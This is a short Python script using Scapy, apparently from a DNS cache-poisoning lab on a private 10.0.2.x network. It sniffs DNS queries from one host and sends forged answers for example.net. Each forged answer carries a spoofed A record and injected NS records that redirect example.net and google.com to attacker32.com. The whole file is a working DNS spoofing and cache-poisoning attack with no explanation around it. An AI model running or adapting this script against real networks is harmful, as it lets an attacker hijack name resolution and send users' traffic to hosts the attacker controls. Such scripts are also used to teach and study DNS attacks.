#!/usr/bin/python
from scapy.all import *
def spoof_dns(pkt):
    if (DNS in pkt and 'example.net' in pkt[DNS].qd.qname):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata='10.0.2.8')
        NSsec1 = DNSRR(rrname=(pkt[DNS].qd.qname)[4:],type='NS',ttl=259200,rdata='attacker32.com')
        NSsec2 = DNSRR(rrname='google.com',type='NS',ttl=259200,rdata='attacker32.com')
        DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=2,an=Anssec,ns=NSsec1/NSsec2)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
pkt = sniff(filter='udp and (src host 10.0.2.14 and dst port 53)', prn=spoof_dns)